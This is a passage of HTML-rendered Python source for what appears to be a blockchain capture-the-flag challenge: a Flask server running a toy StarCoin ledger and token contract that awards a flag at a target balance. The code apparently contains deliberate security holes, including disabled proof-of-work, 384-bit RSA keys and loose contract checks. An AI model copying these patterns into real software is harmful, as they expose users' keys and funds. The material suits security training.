class="keyword">if</span> type(d) != type(&#123;&#125;): <span class="keyword">raise</span> Exception(<span class="string">"Input should be a dict/JSON"</span>)</span><br><span class="line">    <span class="keyword">for</span> attr <span class="keyword">in</span> attrs:</span><br><span class="line">        <span class="keyword">if</span> attr <span class="keyword">not</span> <span class="keyword">in</span> d:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"&#123;&#125; should be presented in the input"</span>.format(attr))</span><br><span class="line"></span><br><span class="line">EMPTY_HASH = <span class="string">'0'</span>*<span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addr_to_pubkey</span><span class="params">(address)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> rsa.PublicKey(int(address, <span class="number">16</span>), <span class="number">65537</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pubkey_to_address</span><span class="params">(pubkey)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> pubkey.e == <span class="number">65537</span></span><br><span class="line">    hexed = hex(pubkey.n)</span><br><span class="line">    <span class="keyword">if</span> hexed.endswith(<span class="string">'L'</span>): hexed = hexed[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">if</span> hexed.startswith(<span class="string">'0x'</span>): hexed = hexed[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> hexed</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_addr_key_pair</span><span class="params">()</span>:</span></span><br><span class="line">    pubkey, privkey = rsa.newkeys(<span class="number">384</span>)</span><br><span class="line">    <span class="keyword">return</span> pubkey_to_address(pubkey), privkey</span><br><span class="line"></span><br><span class="line">bank_address, bank_privkey = gen_addr_key_pair()</span><br><span class="line">hacker_address, hacker_privkey = gen_addr_key_pair()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign_input_utxo</span><span class="params">(input_utxo_id, privkey)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> rsa.sign(input_utxo_id, privkey, <span class="string">'SHA-1'</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_utxo</span><span class="params">(utxo)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> reduce(hash_reducer, [utxo[<span class="string">'id'</span>], utxo[<span class="string">'addr'</span>], str(utxo[<span class="string">'amount'</span>])])</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_output_utxo</span><span class="params">(addr_to, amount)</span>:</span></span><br><span class="line">    utxo = &#123;<span class="string">'id'</span>: str(uuid.uuid4()), <span class="string">'addr'</span>: addr_to, <span class="string">'amount'</span>: amount&#125;</span><br><span class="line">    utxo[<span class="string">'hash'</span>] = hash_utxo(utxo)</span><br><span class="line">    <span class="keyword">return</span> utxo</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_tx</span><span class="params">(tx)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> reduce(hash_reducer, [</span><br><span class="line">        reduce(hash_reducer, tx[<span class="string">'input'</span>], EMPTY_HASH),</span><br><span class="line">        reduce(hash_reducer, [utxo[<span class="string">'hash'</span>] <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]], EMPTY_HASH)</span><br><span class="line">    ])</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tx</span><span class="params">(input_utxo_ids, output_utxo, privkey_from=None)</span>:</span></span><br><span class="line">    tx = &#123;<span class="string">'input'</span>: input_utxo_ids, <span class="string">'signature'</span>: [sign_input_utxo(id, privkey_from) <span class="keyword">for</span> id <span class="keyword">in</span> input_utxo_ids], <span class="string">'output'</span>: output_utxo&#125;</span><br><span class="line">    tx[<span class="string">'hash'</span>] = hash_tx(tx)</span><br><span class="line">    <span class="keyword">return</span> tx</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_block</span><span class="params">(block)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> reduce(hash_reducer, [block[<span class="string">'prev'</span>], block[<span class="string">'nonce'</span>], reduce(hash_reducer, [tx[<span class="string">'hash'</span>] <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]], EMPTY_HASH)])</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_block</span><span class="params">(prev_block_hash, nonce_str, transactions)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type(prev_block_hash) == type(<span class="string">u''</span>): prev_block_hash = str(prev_block_hash)</span><br><span class="line">    <span class="keyword">if</span> type(prev_block_hash) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">'prev_block_hash should be hex-encoded hash value'</span>)</span><br><span class="line">    nonce = str(nonce_str)</span><br><span class="line">    <span class="keyword">if</span> len(nonce) &gt; <span class="number">128</span>: <span class="keyword">raise</span> Exception(<span class="string">'the nonce is too long'</span>)</span><br><span class="line">    block = &#123;<span class="string">'prev'</span>: prev_block_hash, <span class="string">'nonce'</span>: nonce, <span class="string">'transactions'</span>: transactions&#125;</span><br><span class="line">    block[<span class="string">'hash'</span>] = hash_block(block)</span><br><span class="line">    <span class="keyword">return</span> block</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_blockchain_tail</span><span class="params">(blocks=None)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> blocks <span class="keyword">is</span> <span class="keyword">None</span>: blocks = session[<span class="string">'blocks'</span>]</span><br><span class="line">    <span class="keyword">return</span> max(blocks.values(), key=<span class="keyword">lambda</span> block: block[<span class="string">'height'</span>])</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SRC20SmartContract</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, addr, privkey)</span>:</span></span><br><span class="line">        self.starTokenNum = <span class="number">0</span></span><br><span class="line">        self.balanceOfAddr = &#123;addr: <span class="number">999999999</span>&#125;</span><br><span class="line">        self.addr = addr</span><br><span class="line">        self.privkey = privkey</span><br><span class="line">        self.owned_token_utxos = &#123;&#125;</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">onCall_withdraw</span><span class="params">(self, tx)</span>:</span></span><br><span class="line">        <span class="comment"># by calling this you can convert your StarTokens into StarCoins!</span></span><br><span class="line">        <span class="keyword">if</span> len(tx[<span class="string">'input'</span>]) == <span class="number">1</span> <span class="keyword">and</span> len(tx[<span class="string">'output'</span>]) == <span class="number">1</span> <span class="keyword">and</span> len(tx[<span class="string">'signature'</span>]) == <span class="number">0</span> <span class="keyword">and</span> tx[<span class="string">'input'</span>][<span class="number">0</span>] <span class="keyword">in</span> self.owned_token_utxos:</span><br><span class="line">            <span class="comment"># which means that you would like to redeem StarCoins in the input utxo using your StarTokens</span></span><br><span class="line">            recv_addr = tx[<span class="string">'output'</span>][<span class="number">0</span>][<span class="string">'addr'</span>]</span><br><span class="line">            amount_to_redeem = self.owned_token_utxos[tx[<span class="string">'input'</span>][<span class="number">0</span>]][<span class="string">'amount'</span>]</span><br><span class="line">            self.sendTokenAtTx(tx, recv_addr, self.addr, amount_to_redeem)</span><br><span class="line">            tx[<span class="string">'signature'</span>].append(sign_input_utxo(tx[<span class="string">'input'</span>][<span class="number">0</span>], self.privkey))</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">onCall_buyTokens</span><span class="params">(self, utxos, tx)</span>:</span></span><br><span class="line">        <span class="comment"># by calling this you can buy some StarTokens using StarCoins!</span></span><br><span class="line">        <span class="keyword">if</span> len(tx[<span class="string">'input'</span>]) == <span class="number">1</span> <span class="keyword">and</span> len(tx[<span class="string">'output'</span>]) == <span class="number">1</span> <span class="keyword">and</span> tx[<span class="string">'output'</span>][<span class="number">0</span>][<span class="string">'addr'</span>] == self.addr:</span><br><span class="line">            self.sendTokenAtTx(tx, self.addr, utxos[tx[<span class="string">'input'</span>][<span class="number">0</span>]][<span class="string">'addr'</span>], tx[<span class="string">'output'</span>][<span class="number">0</span>][<span class="string">'amount'</span>])</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getTokenBalance</span><span class="params">(self, addr)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> addr <span class="keyword">not</span> <span class="keyword">in</span> self.balanceOfAddr: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> self.balanceOfAddr[addr]</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sendTokenAtTx</span><span class="params">(self, tx, from_addr, to_addr, amount)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.getTokenBalance(from_addr) &lt; amount: <span class="keyword">raise</span> Exception(<span class="string">"no enough StarToken at "</span> + from_addr)</span><br><span class="line">        <span class="keyword">if</span> to_addr == self.addr:</span><br><span class="line">            from_addr, to_addr = to_addr, from_addr</span><br><span class="line">            amount = -amount</span><br><span class="line">        utxo_used_to_record_SRCToken = create_output_utxo(to_addr, <span class="number">0</span>)</span><br><span class="line">        obj = &#123;<span class="string">'utxo_id'</span>: utxo_used_to_record_SRCToken[<span class="string">'id'</span>], <span class="string">'tokenNum'</span>: amount&#125;</span><br><span class="line">        payload = json.dumps(obj)</span><br><span class="line">        signature = self.signSRCTokenUtxoPayload(payload)</span><br><span class="line">        info = signature + <span class="string">'$$$'</span> + payload</span><br><span class="line">        utxo_used_to_record_SRCToken[<span class="string">'extra'</span>] = info</span><br><span class="line">        tx[<span class="string">'output'</span>].append(utxo_used_to_record_SRCToken)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">signSRCTokenUtxoPayload</span><span class="params">(self, payload)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> rsa.sign(payload, self.privkey, <span class="string">'SHA-1'</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verifySRCTokenUtxoPayload</span><span class="params">(self, payload, signature)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> rsa.verify(payload, signature.decode(<span class="string">'hex'</span>), addr_to_pubkey(self.addr))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">extractInfoFromUtxos</span><span class="params">(self, utxos)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> utxo_id, utxo <span class="keyword">in</span> utxos.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'extra'</span> <span class="keyword">in</span> utxo:</span><br><span class="line">                info = utxo[<span class="string">'extra'</span>]</span><br><span class="line">                <span class="keyword">if</span> type(info) == type(<span class="string">u''</span>): info = str(info)</span><br><span class="line">                <span class="keyword">if</span> type(info) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of 'extra' in utxo"</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'$$$'</span> <span class="keyword">not</span> <span class="keyword">in</span> info: <span class="keyword">raise</span> Exception(<span class="string">"signature of SRC20 token is not found"</span>)</span><br><span class="line">                signature = info[:info.index(<span class="string">'$$$'</span>)]</span><br><span class="line">                payload = info[info.index(<span class="string">'$$$'</span>)+<span class="number">3</span>:]</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> self.verifySRCTokenUtxoPayload(payload, signature): <span class="keyword">raise</span> Exception(<span class="string">"this SRC20 token is fake"</span>)</span><br><span class="line">                obj = json.loads(payload)</span><br><span class="line">                <span class="keyword">if</span> obj[<span class="string">'utxo_id'</span>] != utxo[<span class="string">'id'</span>]: <span class="keyword">raise</span> Exception(<span class="string">"the id of utxo does not match the one on the token"</span>)</span><br><span class="line">                <span class="keyword">if</span> utxo[<span class="string">'addr'</span>] <span class="keyword">not</span> <span class="keyword">in</span> self.balanceOfAddr: self.balanceOfAddr[utxo[<span class="string">'addr'</span>]] = <span class="number">0</span></span><br><span class="line">                self.balanceOfAddr[utxo[<span class="string">'addr'</span>]] += obj[<span class="string">'tokenNum'</span>]</span><br><span class="line">            <span class="keyword">if</span> utxo[<span class="string">'addr'</span>] == self.addr: self.owned_token_utxos[utxo[<span class="string">'id'</span>]] = utxo</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate_utxo</span><span class="params">(blockchain_tail)</span>:</span></span><br><span class="line">    starToken_contract = SRC20SmartContract(bank_address, bank_privkey)</span><br><span class="line">    curr_block = blockchain_tail</span><br><span class="line">    blockchain = [curr_block]</span><br><span class="line">    <span class="keyword">while</span> curr_block[<span class="string">'hash'</span>] != session[<span class="string">'genesis_block_hash'</span>]:</span><br><span class="line">        curr_block = session[<span class="string">'blocks'</span>][curr_block[<span class="string">'prev'</span>]]</span><br><span class="line">        blockchain.append(curr_block)</span><br><span class="line">    blockchain = blockchain[::<span class="number">-1</span>]</span><br><span class="line">    utxos = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blockchain:</span><br><span class="line">        <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]:</span><br><span class="line">            <span class="keyword">for</span> input_utxo_id <span class="keyword">in</span> tx[<span class="string">'input'</span>]:</span><br><span class="line">                <span class="keyword">del</span> utxos[input_utxo_id]</span><br><span class="line">            <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]:</span><br><span class="line">                utxos[utxo[<span class="string">'id'</span>]] = utxo</span><br><span class="line">    starToken_contract.extractInfoFromUtxos(utxos)</span><br><span class="line">    <span class="keyword">return</span> utxos, starToken_contract</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate_balance</span><span class="params">(utxos)</span>:</span></span><br><span class="line">    balance = &#123;bank_address: <span class="number">0</span>, hacker_address: <span class="number">0</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> utxo <span class="keyword">in</span> utxos.values():</span><br><span class="line">        <span class="keyword">if</span> utxo[<span class="string">'addr'</span>] <span class="keyword">not</span> <span class="keyword">in</span> balance:</span><br><span class="line">            balance[utxo[<span class="string">'addr'</span>]] = <span class="number">0</span></span><br><span class="line">        balance[utxo[<span class="string">'addr'</span>]] += utxo[<span class="string">'amount'</span>]</span><br><span class="line">    <span class="keyword">return</span> balance</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_utxo_signature</span><span class="params">(address, utxo_id, signature)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> rsa.verify(utxo_id, signature.decode(<span class="string">'hex'</span>), addr_to_pubkey(address))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">append_block</span><span class="params">(block, difficulty=int<span class="params">(<span class="string">'f'</span>*<span class="number">64</span>, <span class="number">16</span>)</span>)</span>:</span></span><br><span class="line">    has_attrs(block, [<span class="string">'prev'</span>, <span class="string">'nonce'</span>, <span class="string">'transactions'</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> type(block[<span class="string">'prev'</span>]) == type(<span class="string">u''</span>): block[<span class="string">'prev'</span>] = str(block[<span class="string">'prev'</span>])</span><br><span class="line">    <span class="keyword">if</span> type(block[<span class="string">'nonce'</span>]) == type(<span class="string">u''</span>): block[<span class="string">'nonce'</span>] = str(block[<span class="string">'nonce'</span>])</span><br><span class="line">    <span class="keyword">if</span> block[<span class="string">'prev'</span>] != find_blockchain_tail()[<span class="string">'hash'</span>]: <span class="keyword">raise</span> Exception(<span class="string">"You do not have the dominant mining power so you can only submit tx to the last block."</span>)</span><br><span class="line">    tail = session[<span class="string">'blocks'</span>][block[<span class="string">'prev'</span>]]</span><br><span class="line">    utxos, contract = calculate_utxo(tail)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> type(block[<span class="string">'transactions'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">'Please put a transaction array in the block'</span>)</span><br><span class="line">    new_utxo_ids = set()</span><br><span class="line">    <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]:</span><br><span class="line">        has_attrs(tx, [<span class="string">'input'</span>, <span class="string">'output'</span>, <span class="string">'signature'</span>])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]:</span><br><span class="line">            has_attrs(utxo, [<span class="string">'amount'</span>, <span class="string">'addr'</span>, <span class="string">'id'</span>])</span><br><span class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'id'</span>]) == type(<span class="string">u''</span>): utxo[<span class="string">'id'</span>] = str(utxo[<span class="string">'id'</span>])</span><br><span class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'addr'</span>]) == type(<span class="string">u''</span>): utxo[<span class="string">'addr'</span>] = str(utxo[<span class="string">'addr'</span>])</span><br><span class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'id'</span>]) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of id of output utxo"</span>)</span><br><span class="line">            <span class="keyword">if</span> utxo[<span class="string">'id'</span>] <span class="keyword">in</span> new_utxo_ids: <span class="keyword">raise</span> Exception(<span class="string">"output utxo of same id(&#123;&#125;) already exists."</span>.format(utxo[<span class="string">'id'</span>]))</span><br><span class="line">            new_utxo_ids.add(utxo[<span class="string">'id'</span>])</span><br><span class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'amount'</span>]) != type(<span class="number">1</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of amount of output utxo"</span>)</span><br><span class="line">            <span class="keyword">if</span> utxo[<span class="string">'amount'</span>] &lt; <span class="number">0</span>: <span class="keyword">raise</span> Exception(<span class="string">"invalid amount of output utxo"</span>)</span><br><span class="line">            <span class="keyword">if</span> type(utxo[<span class="string">'addr'</span>]) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of address of output utxo"</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                addr_to_pubkey(utxo[<span class="string">'addr'</span>])</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">"invalid type of address(&#123;&#125;)"</span>.format(utxo[<span class="string">'addr'</span>]))</span><br><span class="line">            utxo[<span class="string">'hash'</span>] = hash_utxo(utxo)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> new_id <span class="keyword">in</span> new_utxo_ids:</span><br><span class="line">            <span class="keyword">if</span> new_id <span class="keyword">in</span> utxos:</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">"invalid id of output utxo. utxo id(&#123;&#125;) exists"</span>.format(utxo_id))</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">if</span> type(tx[<span class="string">'input'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">"type of input utxo ids in tx should be array"</span>)</span><br><span class="line">        <span class="keyword">if</span> type(tx[<span class="string">'signature'</span>]) != type([]): <span class="keyword">raise</span> Exception(<span class="string">"type of input utxo signatures in tx should be array"</span>)</span><br><span class="line">        </span><br><span class="line">        tx[<span class="string">'input'</span>] = [str(i) <span class="keyword">if</span> type(i) == type(<span class="string">u''</span>) <span class="keyword">else</span> i <span class="keyword">for</span> i <span class="keyword">in</span> tx[<span class="string">'input'</span>]]</span><br><span class="line">        <span class="keyword">for</span> utxo_id <span class="keyword">in</span> tx[<span class="string">'input'</span>]:</span><br><span class="line">            <span class="keyword">if</span> type(utxo_id) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of id of input utxo"</span>)</span><br><span class="line">            <span class="keyword">if</span> utxo_id <span class="keyword">not</span> <span class="keyword">in</span> utxos: <span class="keyword">raise</span> Exception(<span class="string">"invalid id of input utxo. Input utxo(&#123;&#125;) does not exist or it has been consumed."</span>.format(utxo_id))</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">if</span> contract <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'call_smart_contract'</span> <span class="keyword">in</span> tx:</span><br><span class="line">                <span class="keyword">if</span> tx[<span class="string">'call_smart_contract'</span>] == <span class="string">'buyTokens'</span>: contract.onCall_buyTokens(utxos, tx)</span><br><span class="line">                <span class="keyword">if</span> tx[<span class="string">'call_smart_contract'</span>] == <span class="string">'withdraw'</span>: contract.onCall_withdraw(tx)</span><br><span class="line">        </span><br><span class="line">        tot_input = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> len(tx[<span class="string">'input'</span>]) != len(tx[<span class="string">'signature'</span>]): <span class="keyword">raise</span> Exception(<span class="string">"lengths of arrays of ids and signatures of input utxos should be the same"</span>)</span><br><span class="line">        tx[<span class="string">'signature'</span>] = [str(i) <span class="keyword">if</span> type(i) == type(<span class="string">u''</span>) <span class="keyword">else</span> i <span class="keyword">for</span> i <span class="keyword">in</span> tx[<span class="string">'signature'</span>]]</span><br><span class="line">        <span class="keyword">for</span> utxo_id, signature <span class="keyword">in</span> zip(tx[<span class="string">'input'</span>], tx[<span class="string">'signature'</span>]):</span><br><span class="line">            utxo = utxos[utxo_id]</span><br><span class="line">            <span class="keyword">if</span> type(signature) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">"unknown type of signature of input utxo"</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> verify_utxo_signature(utxo[<span class="string">'addr'</span>], utxo_id, signature):</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">"Signature of input utxo is not valid. You are not the owner of this input utxo(&#123;&#125;)!"</span>.format(utxo_id))</span><br><span class="line">            tot_input += utxo[<span class="string">'amount'</span>]</span><br><span class="line">            <span class="keyword">del</span> utxos[utxo_id]</span><br><span class="line">            </span><br><span class="line">        tot_output = sum([utxo[<span class="string">'amount'</span>] <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]])</span><br><span class="line">        <span class="keyword">if</span> tot_output &gt; tot_input:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"You don't have enough amount of StarCoins in the input utxo! &#123;&#125;/&#123;&#125;"</span>.format(tot_input, tot_output))</span><br><span class="line">        tx[<span class="string">'hash'</span>] = hash_tx(tx)</span><br><span class="line">    </span><br><span class="line">    block = create_block(block[<span class="string">'prev'</span>], block[<span class="string">'nonce'</span>], block[<span class="string">'transactions'</span>])</span><br><span class="line">    block_hash = int(block[<span class="string">'hash'</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="comment">#We are users in this challenge, so leave the Proof-of-Work thing to the non-existent miners</span></span><br><span class="line">    <span class="comment">#if block_hash &gt; difficulty: raise Exception('Please provide a valid Proof-of-Work')</span></span><br><span class="line">    block[<span class="string">'height'</span>] = tail[<span class="string">'height'</span>]+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">'blocks'</span>]) &gt; <span class="number">10</span>: <span class="keyword">raise</span> Exception(<span class="string">'The blockchain is too long. Use ./reset to reset the blockchain'</span>)</span><br><span class="line">    <span class="keyword">if</span> block[<span class="string">'hash'</span>] <span class="keyword">in</span> session[<span class="string">'blocks'</span>]: <span class="keyword">raise</span> Exception(<span class="string">'A same block is already in the blockchain'</span>)</span><br><span class="line">    session[<span class="string">'blocks'</span>][block[<span class="string">'hash'</span>]] = block</span><br><span class="line">    session.modified = <span class="keyword">True</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'blocks'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">'blocks'</span>] = &#123;&#125;</span><br><span class="line">    </span><br><span class="line">        <span class="comment"># At first, the bank issued some StarCoins, and give you 100</span></span><br><span class="line">        currency_issued = create_output_utxo(bank_address, <span class="number">200</span>)</span><br><span class="line">        airdrop = create_output_utxo(hacker_address, <span class="number">100</span>)</span><br><span class="line">        genesis_transaction = create_tx([], [currency_issued, airdrop]) <span class="comment"># create StarCoins from nothing</span></span><br><span class="line">        genesis_block = create_block(EMPTY_HASH, <span class="string">'The Times 03/Jan/2009 Chancellor on brink of second bailout for bank'</span>, [genesis_transaction])</span><br><span class="line">        </span><br><span class="line">        session[<span class="string">'genesis_block_hash'</span>] = genesis_block[<span class="string">'hash'</span>]</span><br><span class="line">        genesis_block[<span class="string">'height'</span>] = <span class="number">0</span></span><br><span class="line">        session[<span class="string">'blocks'</span>][genesis_block[<span class="string">'hash'</span>]] = genesis_block</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_balance_of_all</span><span class="params">()</span>:</span></span><br><span class="line">    init()</span><br><span class="line">    tail = find_blockchain_tail()</span><br><span class="line">    utxos, contract = calculate_utxo(tail)</span><br><span class="line">    <span class="keyword">return</span> calculate_balance(utxos), utxos, tail, contract</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(url_prefix+'/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">homepage</span><span class="params">()</span>:</span></span><br><span class="line">    announcement = <span class="string">''</span></span><br><span class="line">    balance, utxos, _, contract = get_balance_of_all()</span><br><span class="line">    genesis_block_info = <span class="string">'hash of genesis block: '</span> + session[<span class="string">'genesis_block_hash'</span>]</span><br><span class="line">    addr_info = <span class="string">'the bank\'s addr: '</span> + bank_address + <span class="string">', your addr: '</span> + hacker_address + <span class="string">', your privkey: '</span> + pickle.dumps(hacker_privkey).encode(<span class="string">'hex'</span>)</span><br><span class="line">    balance_info = <span class="string">'StarCoins balance of all addresses: '</span> + json.dumps(balance)</span><br><span class="line">    starcoins_utxo_info = <span class="string">'All utxos: '</span> + json.dumps(utxos)</span><br><span class="line">    startokens_info = <span class="string">'StarTokens balance of all addresses: '</span> + json.dumps(contract.balanceOfAddr)</span><br><span class="line">    blockchain_info = <span class="string">'Blockchain Explorer: '</span> + json.dumps(session[<span class="string">'blocks'</span>])</span><br><span class="line">    view_source_code_link = <span class="string">"&lt;a href='source_code'&gt;View source code&lt;/a&gt;"</span></span><br><span class="line">    <span class="keyword">return</span> announcement+(<span class="string">'.&lt;br /&gt;&lt;br /&gt;\r\n\r\n'</span>.join([view_source_code_link, genesis_block_info, addr_info, balance_info, starcoins_utxo_info, startokens_info, blockchain_info]))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">DIFFICULTY = int(<span class="string">'00000'</span> + <span class="string">'f'</span> * <span class="number">59</span>, <span class="number">16</span>)</span><br><span class="line"><span class="meta">@app.route(url_prefix+'/create_block', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_block_api</span><span class="params">()</span>:</span></span><br><span class="line">    init()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        block = json.loads(request.data)</span><br><span class="line">        append_block(block, DIFFICULTY)</span><br><span class="line">        msg = <span class="string">'transaction finished.'</span></span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">return</span> str(e)</span><br><span class="line">        </span><br><span class="line">    balance, utxos, tail, contract = get_balance_of_all()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> balance[hacker_address] == <span class="number">200</span>:</span><br><span class="line">        msg += <span class="string">' Congratulations~ '</span> + FLAG()</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line">    </span><br><span class="line">        </span><br><span class="line"><span class="comment"># if you mess up the blockchain, use this to reset the blockchain.</span></span><br><span class="line"><span class="meta">@app.route(url_prefix+'/reset')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_blockchain</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'blocks'</span> <span class="keyword">in</span> session: <span class="keyword">del</span> session[<span class="string">'blocks'</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'genesis_block_hash'</span> <span class="keyword">in</span> session: <span class="keyword">del</span> session[<span class="string">'genesis_block_hash'</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'reset.'</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(url_prefix+'/source_code')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_source_code</span><span class="params">()</span>:</span></span><br><span class="line">    source = open(<span class="string">'serve.py'</span>, <span class="string">'r'</span>)</span><br><span class="line">    html = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">        line = line.decode(<span class="string">'utf8'</span>, <span class="string">'ignore'</span>)</span><br><span class="line">        html += line.replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(<span class="string">' '</span>,<span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>).replace(<span 